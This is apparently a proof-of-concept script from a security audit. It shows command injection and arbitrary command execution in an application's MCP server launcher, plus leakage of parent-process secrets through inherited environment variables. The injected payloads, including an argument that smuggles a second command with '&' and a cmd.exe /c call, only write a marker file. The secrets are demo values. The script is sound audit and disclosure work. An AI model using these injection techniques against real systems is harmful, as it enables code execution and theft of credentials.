// =============================================================================
// PoC-01 — 恶意 MCP 服务器：命令执行（F-06）+ env 全量继承（F-07）
// 基线：b84227d9 ｜ 复刻目标：src/mcp/mcp-connection.ts:64-84
//   const env = { ...config.env };
//   for (const key of Object.keys(parentEnv)) env[key] = parentEnv[key];
//   child = spawn(config.command, config.args, { env, stdio: [...], shell: process.platform === 'win32' });
// 运行：node poc-01-mcp-shell-injection.js
// 无害演示：注入/执行的命令仅写 marker 文件到 poc/ 目录，不执行破坏性操作。
// =============================================================================

'use strict';

const { spawnSync } = require('node:child_process');
const path = require('node:path');
const fs = require('node:fs');

const POC_DIR = __dirname;
const MARKER = path.join(POC_DIR, 'poc-01-injected-marker.txt');
const OUT_FILE = path.join(POC_DIR, 'poc-01-out.txt');

function cleanup() {
  try { fs.rmSync(MARKER, { force: true }); } catch { /* ignore */ }
}

// --- 复刻 mcp-connection.ts 的 env 构造 -------------------------------------------------
function buildMcpEnv(configEnv, parentEnv) {
  const env = { ...configEnv };
  for (const key of Object.keys(parentEnv)) {
    if (!(key in env)) env[key] = parentEnv[key]; // 注释自述用于 "API key injections"
  }
  return env;
}

const lines = [];
function log(s = '') { lines.push(s); }

log('='.repeat(72));
log('PoC-01 结果汇总（F-06 命令执行 / F-07 env 继承）');
log('='.repeat(72));

// ─── 实验 A1：shell:true + args 内嵌 &（目标代码 win32 分支行为） ─────────────────────
cleanup();
{
  const markerArg = 'SAFE&echo PWNED_BY_INJECTION> ' + JSON.stringify(MARKER).replace(/"/g, '');
  const config = { command: process.execPath, args: ['-e', `process.stdout.write(${JSON.stringify(markerArg)})`] };
  const r = spawnSync(config.command, config.args, {
    stdio: ['ignore', 'pipe', 'pipe'],
    shell: process.platform === 'win32', // 与 mcp-connection.ts 一致
    encoding: 'utf-8',
    timeout: 15000,
  });
  const injected = fs.existsSync(MARKER);
  log('\n### A1  shell:true（win32 分支，按目标代码复刻）');
  log(`  exitCode: ${r.status}`);
  log(`  stdout:   ${(r.stdout || '').trim().slice(0, 160)}`);
  log(`  stderr:   ${(r.stderr || '').trim().slice(0, 160)}`);
  log(`  markerWritten: ${injected}`);
  log(`  判定: ${injected ? 'VULN_CONFIRMED — args 内 & 注入被 cmd.exe 解释执行' : '未复现注入（Node v24 shell:true 对 args 做引用转义，& 被字面传递）'}`);
}

// ─── 实验 A2：对照 shell:false（修复建议） ────────────────────────────────────────────
{
  const markerArg = 'SAFE&echo PWNED_BY_INJECTION> ' + JSON.stringify(MARKER).replace(/"/g, '');
  const config = { command: process.execPath, args: ['-e', `process.stdout.write(${JSON.stringify(markerArg)})`] };
  const r = spawnSync(config.command, config.args, {
    stdio: ['ignore', 'pipe', 'pipe'],
    shell: false,
    encoding: 'utf-8',
    timeout: 15000,
  });
  const injected = fs.existsSync(MARKER);
  log('\n### A2  对照 shell:false（建议修复）');
  log(`  exitCode: ${r.status}`);
  log(`  stdout:   ${(r.stdout || '').trim().slice(0, 160)}`);
  log(`  markerWritten: ${injected}`);
  log(`  判定: ${injected ? '异常' : 'OK — 注入字符被当作字面参数，未执行'}`);
}

// ─── 实验 A3：command 完全可控（mcp:add-server 无校验透传）→ 任意命令执行 ─────────────
// mcp/mcp-ipc.ts: ipcMain.handle('mcp:add-server', (_event, server) => client.addServer(server)) 无校验
cleanup();
{
  const config = {
    command: process.env.ComSpec || 'cmd.exe', // 攻击者指定任意可执行文件
    args: ['/c', 'echo PWNED_BY_COMMAND_CONTROL> ' + JSON.stringify(MARKER).replace(/"/g, '')],
  };
  const r = spawnSync(config.command, config.args, {
    stdio: ['ignore', 'pipe', 'pipe'],
    shell: false, // 关键：即使 shell:false，command 可控 = 任意命令执行
    encoding: 'utf-8',
    timeout: 15000,
  });
  const executed = fs.existsSync(MARKER);
  log('\n### A3  command 可控（mcp:add-server 无校验透传）');
  log(`  exitCode: ${r.status}`);
  log(`  stdout:   ${(r.stdout || '').trim().slice(0, 160)}`);
  log(`  markerWritten: ${executed}`);
  log(`  判定: ${executed ? 'VULN_CONFIRMED — 任意 command 执行（RCE），不依赖 shell:true' : '未复现'}`);
  log(`  说明: 攻击者通过 mcp:add-server 提交 { command: 任意路径, args: [...] } 即达成 RCE；`);
  log(`        shell:true 仅是额外放大面（含 & 的 args 可能二次注入）。`);
}

// ─── 实验 B：env 全量继承（F-07）→ 子进程可见父进程全部变量（含密钥） ─────────────────
{
  const fakeParentEnv = {
    ...process.env,
    PUEBLO_API_KEY_LEAK_DEMO: 'sk-demo-1234567890abcdef',
    AWS_SECRET_ACCESS_KEY_LEAK_DEMO: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
  };
  const env = buildMcpEnv({}, fakeParentEnv); // 恶意 MCP 配置不声明任何 env
  const r = spawnSync(process.execPath, ['-e', 'console.log(JSON.stringify(Object.keys(process.env).filter(k => k.includes("LEAK_DEMO"))))'], {
    env,
    stdio: ['ignore', 'pipe', 'pipe'],
    encoding: 'utf-8',
    timeout: 15000,
  });
  let leaked = [];
  try { leaked = JSON.parse((r.stdout || '').trim()); } catch { /* ignore */ }
  log('\n### B  env 继承（子进程视角）');
  log(`  leakedEnvKeys: ${JSON.stringify(leaked)}`);
  log(`  判定: ${leaked.length > 0 ? `VULN_CONFIRMED — MCP 子进程可读取父进程 env 中 ${leaked.length} 个密钥类变量（F-07）` : '未复现'}`);
}

log('\n复现依据：src/mcp/mcp-connection.ts:64-84（env 构造）与 spawn(shell: win32)');
log('          src/mcp/mcp-ipc.ts（mcp:add-server 无校验透传）');

const out = lines.join('\n');
console.log(out);
fs.writeFileSync(OUT_FILE, out, 'utf-8');
cleanup();
